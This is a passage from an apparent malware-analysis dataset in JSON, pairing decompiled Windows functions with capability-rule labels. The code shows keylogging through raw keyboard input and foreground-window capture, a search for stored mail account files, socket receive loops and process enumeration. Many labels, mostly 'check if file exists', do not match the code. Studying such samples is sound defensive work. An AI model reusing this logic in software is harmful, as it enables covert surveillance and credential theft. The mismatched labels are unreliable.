0xffffffff;\n        }\n    }\n    uVar5 = 0;\ncode_r0x004058b1:\n    fcn.00405ea5();\n    return uVar5;\n}\n",
        "token_count": 572
    },
    "0040902e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040902e(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    uint uVar6;\n    uchar *arg_8h_00;\n    uchar *arg_8h_01;\n    uint uVar7;\n    ushort uVar8;\n    uint arg_18h;\n    uint uStack604;\n    uint uStack600;\n    int32_t iStack596;\n    uint uStack592;\n    ushort uStack576;\n    ushort uStack574;\n    uint uStack572;\n    uint uStack568;\n    ushort uStack564;\n    uchar auStack560 [16];\n    uchar auStack544 [16];\n    uchar auStack528 [44];\n    uchar auStack484 [480];\n    \n    uVar6 = 0;\n    uStack604 = 0;\n    fcn.00401052(&stack0xfffffdf0, 0, 0x208);\n    if (arg_ch == 1) {\n        uStack574 = 6;\n        uStack568 = arg_8h;\n        uStack572 = 0x130;\n        uStack576 = 1;\n        (*_sym.imp.USER32.dll_RegisterRawInputDevices)(&stack0xfffffdc0, 1, 0xc);\n        goto code_r0x004093b6;\n    }\n    if (arg_ch == 0x10) {\n        (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n        goto code_r0x004093b6;\n    }\n    if (arg_ch != 0xff) {\n        uVar6 = (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n        goto code_r0x004093b6;\n    }\n    uVar7 = 0x10;\n    iVar2 = (*_sym.imp.USER32.dll_GetRawInputData)(arg_14h, 0x10000003, 0, &stack0xfffffda4);\n    if (iVar2 == -1) goto code_r0x004093b6;\n    iVar2 = fcn.00405f53();\n    iStack596 = iVar2;\n    if (iVar2 == 0) goto code_r0x004093b6;\n    iVar3 = (*_sym.imp.USER32.dll_GetRawInputData)(arg_14h, 0x10000003, iVar2, &stack0xfffffd94, 0x10);\n    if ((iVar3 != unaff_ESI) || (*(iVar2 + 0x18) != 0x100)) goto code_r0x004093b6;\n    uVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n    uVar8 = unaff_ESI >> 0x10;\n    iVar2 = (*_sym.imp.USER32.dll_GetWindowTextW)(uVar4, &stack0xfffffde0, 0x104);\n    if (iVar2 < 1) {\n        fcn.004032ff(L\"Unknow\");\n    }\n    else {\n        uVar4 = fcn.004035e5(&stack0xfffffe1c);\n        uStack592 = 0x409127;\n        fcn.00403437(uVar4);\n        uStack592 = 0x409130;\n        fcn.00405ea5();\n    }\n    fcn.004094ae();\n    uStack592 = 0x40915a;\n    fcn.00403437(&stack0xfffffdc8);\n    iStack596 = 0x40916c;\n    fcn.0040346a(*0x4196a0 + 4);\n    if (**0x4196a0 != 0) {\n        unaff_EBX = 0x409185;\n        fcn.00401361(*0x4196a0 + 0x286);\n        arg_8h_01 = &stack0xfffffdc8;\n        fcn.0040362d(arg_8h_01);\n        arg_18h = CONCAT22(uVar8, uStack564);\n        arg_8h_00 = &stack0xfffffdd0;\n        uVar4 = uStack568;\n        fcn.0040362d(arg_8h_00);\n        uVar7 = fcn.004049ab(arg_8h_00, arg_8h_01, uVar7, uVar4, arg_18h);\n        fcn.00404f2b(uVar7);\n        fcn.00404981();\n    }\n    if ((*0x4196a0)[0x285] != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*0x4196a0 + 0x84);\n        if (iVar2 == 0) {\ncode_r0x00409239:\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x4196a0 + 0x84, unaff_EBX);\n            piVar5 = *0x4196a0;\n            (*0x4196a0)[0x284] = 0;\n        }\n        else {\n            uVar7 = fcn.004035e5(*0x4196a0 + 0x84);\n            iVar2 = fcn.00403248(uVar7);\n            fcn.00405ea5();\n            piVar5 = *0x4196a0;\n            if (iVar2 == 0) goto code_r0x00409239;\n            (*0x4196a0)[0x284] = 1;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(piVar5[3], 4, 1, 0, 4, 0x80, 0);\n        piVar5 = *0x4196a0;\n        pcVar1 = _sym.imp.KERNEL32.dll_WriteFile;\n        (*0x4196a0)[1] = iVar2;\n        if (piVar5[0x284] == 0) {\n            uVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(0x414ad0, piVar5 + 2, 0);\n            uVar4 = 0x414ad0;\n            (*pcVar1)((*0x4196a0)[1], 0x414ad0, uVar7);\n            uVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(0x414ad0, *0x4196a0 + 2, 0);\n            (*pcVar1)((*0x4196a0)[1], 0x414ad0, uVar7);\n            iVar2 = fcn.00403261(*0x4196a0 + 2, 0);\n            (*pcVar1)((*0x4196a0)[1], uVar4, iVar2 * 2);\n            uVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(0x414ad0, *0x4196a0 + 2, 0);\n            (*pcVar1)((*0x4196a0)[1], 0x414ad0, uVar7);\n            uVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(0x414ad0, *0x4196a0 + 2, 0);\n            (*pcVar1)((*0x4196a0)[1], 0x414ad0, uVar7);\n            piVar5 = *0x4196a0;\n        }\n        uVar7 = fcn.004093c8(piVar5 + 2, 0);\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(uVar7);\n        uVar7 = fcn.004093c8(iVar2 * 2);\n        (*pcVar1)((*0x4196a0)[1], uVar7);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)((*0x4196a0)[1]);\n    }\n    fcn.00405ea5();\n    uStack600 = 0;\n    fcn.00405ea5();\ncode_r0x004093b6:\n    fcn.00405ea5();\n    return uVar6;\n}\n",
        "token_count": 1857
    },
    "00409df6": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00409df6(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint lpFileName;\n    uint var_354h;\n    uint32_t lpFindFileData;\n    uint var_220h;\n    uint var_10ch;\n    \n    (*_sym.imp.KERNEL32.dll_GetFullPathNameA)(0x4196a8, 0x104, &var_354h, 0);\n    pcVar1 = _sym.imp.SHLWAPI.dll_PathCombineA;\n    (*_sym.imp.SHLWAPI.dll_PathCombineA)(&lpFileName, &var_354h, 0x415f88);\n    iVar2 = (*_sym.imp.KERNEL32.dll_FindFirstFileA)(&lpFileName, &lpFindFileData);\n    if (iVar2 != -1) {\n        do {\n            if (((lpFindFileData | 0x10) == 0x10) && (var_220h != '.')) {\n                (*pcVar1)(&var_10ch, 0x4196a8, &var_220h);\n                (*pcVar1)(&var_10ch, &var_10ch, \"Accounts\\\\Account.rec0\");\n                fcn.00409adf(&var_10ch);\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_FindNextFileA)(iVar2, &lpFindFileData);\n        } while (iVar3 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 341
    },
    "0040cba8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cba8(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EDX;\n    uint uVar3;\n    int32_t lpFileSize;\n    int32_t var_ch;\n    int32_t lpNumberOfBytesRead;\n    int32_t *hMem;\n    \n    uVar3 = 0;\n    if (*0x4197ac == 0) {\n        hMem = in_EDX;\n        iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n        if ((iVar1 != 0) && (iVar1 != -1)) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetFileSizeEx)(iVar1, &lpFileSize);\n            if ((iVar2 != 0) && (var_ch == 0)) {\n                *arg_8h = lpFileSize;\n                iVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, lpFileSize);\n                *hMem = iVar2;\n                if (iVar2 != 0) {\n                    iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar1, iVar2, *arg_8h, &lpNumberOfBytesRead, 0);\n                    if ((iVar2 == 0) || (*arg_8h != lpNumberOfBytesRead)) {\n                        (*_sym.imp.KERNEL32.dll_LocalFree)(*hMem);\n                    }\n                    else {\n                        uVar3 = 1;\n                    }\n                }\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        }\n    }\n    else {\n        uVar3 = fcn.0040cc54(arg_8h);\n    }\n    return uVar3;\n}\n",
        "token_count": 376
    },
    "0040d0a3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d0a3(uint *arg_8h)\n\n{\n    char cVar1;\n    int32_t buf;\n    uint var_1000h;\n    uint uStackY32;\n    uint uStackY28;\n    uint *puStackY24;\n    uint uStackY20;\n    \n    fcn.00401190();\n    puStackY24 = &fcn.0040d0a3::var_1000h;\n    uStackY20 = 0;\n    uStackY28 = 0x40d0c6;\n    fcn.00401052();\n    while( true ) {\n        puStackY24 = &fcn.0040d0a3::var_1000h;\n        uStackY20 = 0x1000;\n        uStackY28 = *arg_8h;\n        uStackY32 = 0x40d103;\n        buf = (*_sym.imp.WS2_32.dll_recv)();\n        if (buf == -1) {\n            return 0;\n        }\n        uStackY20 = 0x40d0da;\n        cVar1 = fcn.0040d2ad(buf);\n        if (cVar1 == '\\0') break;\n        puStackY24 = &fcn.0040d0a3::var_1000h;\n        uStackY20 = 0;\n        uStackY28 = 0x40d0ee;\n        fcn.00401052();\n    }\n    return 0;\n}\n",
        "token_count": 331
    },
    "0040d110": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d110(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t buf;\n    uint var_1000h;\n    uint uStackY32;\n    uint uStackY28;\n    uint *puStackY24;\n    uint uStackY20;\n    \n    fcn.00401190();\n    puStackY24 = &fcn.0040d110::var_1000h;\n    uStackY20 = 0;\n    uStackY28 = 0x40d133;\n    fcn.00401052();\n    while( true ) {\n        puStackY24 = &fcn.0040d110::var_1000h;\n        uStackY20 = 0x1000;\n        uStackY28 = *(arg_8h + 4);\n        uStackY32 = 0x40d170;\n        buf = (*_sym.imp.WS2_32.dll_recv)();\n        if (buf == -1) {\n            return 0;\n        }\n        uStackY20 = 0x40d146;\n        cVar1 = fcn.0040d2ad(buf);\n        if (cVar1 == '\\0') break;\n        puStackY24 = &fcn.0040d110::var_1000h;\n        uStackY20 = 0;\n        uStackY28 = 0x40d15a;\n        fcn.00401052();\n    }\n    return 0;\n}\n",
        "token_count": 324
    },
    "0040ee44": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ee44(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uchar auStack408 [404];\n    \n    (*_sym.imp.WS2_32.dll_WSAStartup)(2, auStack408);\n    iVar1 = fcn.0040ee9a();\n    if (iVar1 == -1) {\n        (*_sym.imp.WS2_32.dll_WSACleanup)();\n    }\n    fcn.00401052(0x4198c0, 0, 0x13332c);\n    fcn.0040ef4f();\n    return;\n}\n",
        "token_count": 134
    },
    "0040f23d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040f23d(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_10h;\n    uint s;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    s = *0x4198b4;\n    var_4h = fcn.00401085(0x2000);\n    arg_ch = fcn.00401085(0x2000);\n    var_10h = 0;\n    var_8h = 0;\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    iVar3 = 0;\n    while( true ) {\n        iVar2 = (*_sym.imp.WS2_32.dll_recv)(s, arg_ch, 8 - iVar3, 0);\n        if (iVar2 == 0) {\n            *0x419695 = 0;\n            return arg_8h;\n        }\n        if (iVar2 == -1) break;\n        fcn.0040102c(var_4h + iVar3, arg_ch, iVar2);\n        iVar1 = var_4h;\n        iVar3 = iVar3 + iVar2;\n        if (7 < iVar3) {\n            fcn.0040102c(&var_10h, var_4h, 4);\n            fcn.0040102c(&var_8h, iVar1 + 4, 4);\n            iVar3 = 0;\n            if (0 < var_8h) {\n                do {\n                    iVar2 = (*_sym.imp.WS2_32.dll_recv)(s, arg_ch, var_8h - iVar3, 0);\n                    if ((iVar2 == 0) || (iVar2 == -1)) {\n                        *0x419695 = 0;\n                        return arg_8h;\n                    }\n                    fcn.0040102c(var_4h + iVar3, arg_ch, iVar2);\n                    iVar3 = iVar3 + iVar2;\n                } while (iVar3 < var_8h);\n            }\n            arg_8h[1] = var_8h;\n            *arg_8h = var_10h;\n            arg_8h[2] = var_4h;\n            fcn.00401099(arg_ch);\n            return arg_8h;\n        }\n    }\n    *0x419695 = 0;\n    return arg_8h;\n}\n",
        "token_count": 567
    },
    "0040f33c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040f33c(uint param_1, ushort param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_820h;\n    uint name;\n    uint var_14h;\n    \n    uVar1 = (*_sym.imp.WS2_32.dll_socket)(0x17, 1, 6);\n    name._0_2_ = 0x17;\n    fcn.0040102c(&var_14h, param_1, 0x10);\n    name._2_2_ = param_2;\n    iVar2 = (*_sym.imp.WS2_32.dll_connect)(uVar1, &name, 0x1c);\n    if (iVar2 != -1) {\n        fcn.00401052(&var_820h, 0, 0x802);\n        (*_sym.imp.WS2_32.dll_InetNtopW)(0x17, &var_14h, &var_820h, 0x802);\n    }\n    return uVar1;\n}\n",
        "token_count": 247
    },
    "0040f3bd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040f3bd(uint *param_1, ushort param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_818h;\n    uint name;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *param_1;\n    uVar1 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 6);\n    name._0_2_ = 2;\n    var_10h = var_4h;\n    name._2_2_ = param_2;\n    iVar2 = (*_sym.imp.WS2_32.dll_connect)(uVar1, &name, 0x10);\n    if (iVar2 != -1) {\n        fcn.00401052(&var_818h, 0, 0x802);\n        (*_sym.imp.WS2_32.dll_InetNtopW)(2, &var_4h, &var_818h, 0x802);\n    }\n    return uVar1;\n}\n",
        "token_count": 247
    },
    "0040f69f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040f69f(uint *param_1, uint *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(*param_1, 0, 2);\n    if (((iVar2 != -1) && (iVar3 = (*_sym.imp.KERNEL32.dll_FindResourceW)(iVar2, 1, 0x10),  iVar3 != 0)) &&\n       (iVar3 = (*_sym.imp.KERNEL32.dll_LoadResource)(iVar2, iVar3),  iVar3 != 0)) {\n        uVar1 = *(iVar3 + 0x28);\n        *param_2 = *(iVar3 + 0x14);\n        *(param_2 + 1) = *(iVar3 + 0x1a);\n        *(param_2 + 6) = *(iVar3 + 0x18);\n        param_2[2] = uVar1 & 1;\n        param_2[3] = uVar1 >> 1 & 1;\n        param_2[4] = uVar1 >> 3 & 1;\n        param_2[5] = uVar1 >> 5 & 1;\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar2);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 315
    },
    "0040fdf0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040fdf0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(param_1 + 4), 0xc0000000, 1, 0, 1, 0, 0);\n    *(param_1 + 8) = iVar1;\n    if ((iVar1 == -1) && (iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar1 == 0x50)) {\n        *(param_1 + 8) = 0;\n        uVar2 = fcn.00410192(0xc0000000);\n        return uVar2;\n    }\n    return *(param_1 + 8) != -1;\n}\n",
        "token_count": 186
    },
    "0040ff27": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040ff27(uint lpFileName)\n\n{\n    int32_t iVar1;\n    uint arg_8h;\n    int32_t iVar2;\n    bool bVar3;\n    uint *arg_8h_00;\n    uint in_stack_fffffd40;\n    uint in_stack_fffffd44;\n    uint lpFindFileData;\n    uint var_268h;\n    uint var_264h;\n    uint var_258h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_10h = 0;\n    var_ch = 5;\n    var_14h = 5;\n    fcn.00401875();\n    iVar1 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n    bVar3 = iVar1 == -1;\n    while (!bVar3) {\n        var_34h = 0;\n        bVar3 = (lpFindFileData & 0x10) == 0;\n        if (bVar3) {\n            _var_2ch = CONCAT44(var_268h, var_264h);\n        }\n        else {\n            _var_2ch = 0;\n        }\n        var_24h = !bVar3;\n        arg_8h = fcn.004035e5(&var_258h);\n        fcn.00403437(arg_8h);\n        fcn.00405ea5();\n        var_8h = 0;\n        arg_8h_00 = &var_34h;\n        fcn.0040362d(arg_8h_00);\n        fcn.00401776(arg_8h_00, in_stack_fffffd40, in_stack_fffffd44, var_2ch, var_28h);\n        fcn.00405ea5();\n        iVar2 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar1, &lpFindFileData);\n        bVar3 = iVar2 == 0;\n    }\n    fcn.00401361(&var_18h);\n    if (var_18h != 0) {\n        fcn.00401ad5(var_18h);\n    }\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 554
    },
    "00410192": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00410192(uint dwDesiredAccess)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(in_ECX + 4), dwDesiredAccess, 1, 0, 3, 0, 0);\n    *(in_ECX + 8) = iVar1;\n    if (iVar1 == -1) {\n        *(in_ECX + 8) = 0;\n    }\n    else {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar1, 0);\n        *(in_ECX + 0x14) = uVar2;\n    }\n    return iVar1 != -1;\n}\n",
        "token_count": 173
    },
    "004101d1": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004101d1(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(param_1 + 4), 0x40000000, 1, 0, 2, 0, 0);\n    *(param_1 + 8) = iVar1;\n    if (iVar1 == -1) {\n        *(param_1 + 8) = 0;\n    }\n    return iVar1 != -1;\n}\n",
        "token_count": 120
    },
    "00410298": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00410298(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0, 0);\n    *param_1 = iVar1;\n    param_1[1] = iVar1 != -1;\n    return param_1;\n}\n",
        "token_count": 84
    },
    "00410c79": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00410c79(uint *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_22ch;\n    int32_t var_224h;\n    uint var_208h;\n    \n    var_22ch = 0x22c;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    if (iVar1 != -1) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(iVar1, &var_22ch);\n        while (iVar2 != 0) {\n            if (var_224h == param_2) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n                fcn.004035e5(&var_208h);\n                return param_1;\n            }\n            iVar2 = (*_sym.imp.KERNEL32.dll_Process32NextW)(iVar1, &var_22ch);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    *param_1 = 0;\n    return param_1;\n}\n",
        "token_count": 256
    },
    "00410d24": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00410d24(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *arg_8h;\n    uint *arg_8h_00;\n    uint var_668h;\n    uint var_258h;\n    uint var_254h;\n    uint dwProcessId;\n    uint var_234h;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401052(&var_254h, 0, 0x228);\n    var_258h = 0x22c;\n    var_20h = 0;\n    var_1ch = 5;\n    var_24h = 5;\n    fcn.004016e3();\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    if (iVar1 != -1) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(iVar1, &var_258h);\n        if (iVar2 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            fcn.0040131a(&var_28h);\n            if (var_28h == 0) {\n                return param_1;\n            }\n            for (iVar1 = *(var_28h + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n                fcn.00401416();\n            }\n            return param_1;\n        }\n        do {\n            var_8h = 0;\n            var_ch = dwProcessId;\n            var_4h = var_8h;\n            fcn.004032ff(&var_234h);\n            iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1410, 0, dwProcessId);\n            if (iVar2 == -1) {\n                uVar4 = fcn.004035e5(0x414c14);\n                fcn.00403437(uVar4);\n                fcn.00405ea5();\n                var_18h = 0;\n            }\n            else {\n                fcn.00401052(&var_668h, 0, 0x410);\n                iVar3 = (*_sym.imp.PSAPI.DLL_GetModuleFileNameExW)(iVar2, 0, &var_668h, 0x208);\n                if (iVar3 == 0) {\n                    uVar4 = fcn.004035e5(0x414c14);\n                    fcn.00403437(uVar4);\n                    fcn.00405ea5();\n                    var_14h = 0;\n                }\n                else {\n                    uVar4 = fcn.004035e5(&var_668h);\n                    fcn.00403437(uVar4);\n                    fcn.00405ea5();\n                    var_10h = 0;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            }\n            arg_8h_00 = &var_8h;\n            uVar4 = var_ch;\n            fcn.0040362d(arg_8h_00);\n            arg_8h = &var_4h;\n            fcn.0040362d(arg_8h);\n            fcn.004015c0(arg_8h, arg_8h_00, uVar4);\n            fcn.00401416();\n            iVar2 = (*_sym.imp.KERNEL32.dll_Process32NextW)(iVar1, &var_258h);\n        } while (iVar2 != 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    fcn.0040131a(&var_28h);\n    if (var_28h != 0) {\n        for (iVar1 = *(var_28h + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n            fcn.00401416();\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 946
    },
    "00411d35": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411d35(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    uint lpNumberOfBytesWritten;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_WriteFile)(iVar1);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "00411d78": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411d78(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    uint lpNumberOfBytesWritten;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_WriteFile)(iVar1);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "00411e21": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00411e21(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint lpNumberOfBytesRead;\n    \n    lpNumberOfBytesRead = param_1;\n    uVar1 = fcn.00401085(0x400000);\n    lpNumberOfBytesRead = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileA)(param_1, 0x80000000, 0, 0, 3, 0x80, 0);\n    if (iVar2 == -1) {\n        *param_2 = 0;\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar2, 0);\n    *param_2 = uVar3;\n    iVar4 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, uVar1, uVar3, &lpNumberOfBytesRead, 0);\n    if (iVar4 == 0) {\n        *param_2 = 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    return uVar1;\n}\n",
        "token_count": 268
    },
    "004046a5": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004046a5(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStack96;\n    uchar auStack92 [4];\n    uchar auStack88 [4];\n    uchar auStack84 [52];\n    uint uStack32;\n    uint uStack28;\n    uchar auStack24 [16];\n    \n    uStack28 = 0;\n    uStack32 = 0x11;\n    arg_ch = 0;\n    auStack24 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            arg_8h_00 = fcn.00401581(&uStack96, arg_ch);\n            fcn.00403761(arg_8h_00);\n            fcn.00405ea5();\n            iVar1 = fcn.00401581(auStack92, arg_ch);\n            fcn.00403740(*(iVar1 + 4));\n            fcn.00405ea5();\n            iVar1 = fcn.00401581(auStack88, arg_ch);\n            fcn.00403740(*(iVar1 + 8));\n            fcn.00405ea5();\n            iVar1 = fcn.00401581(auStack84, arg_ch);\n            fcn.00403740(*(iVar1 + 0xc));\n            fcn.00405ea5();\n            uStack96 = 0;\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.00403679(arg_8h);\n    fcn.00403665();\n    return arg_8h;\n}\n",
        "token_count": 388
    },
    "0040882f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
